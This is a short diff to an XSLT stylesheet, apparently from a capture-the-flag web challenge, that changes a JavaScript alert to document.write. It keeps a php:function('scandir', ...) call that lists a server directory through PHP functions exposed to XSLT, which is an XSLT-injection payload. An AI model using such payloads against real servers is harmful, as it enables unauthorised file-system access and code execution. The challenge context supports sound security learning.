@@ -4,7 +4,7 @@ xmlns:php="http://php.net/xsl"
 xmlns:func="http://exslt.org/functions"
 >	
 <func:script language="javascript" >
-alert(4);
+document.write("hello world");
 </func:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
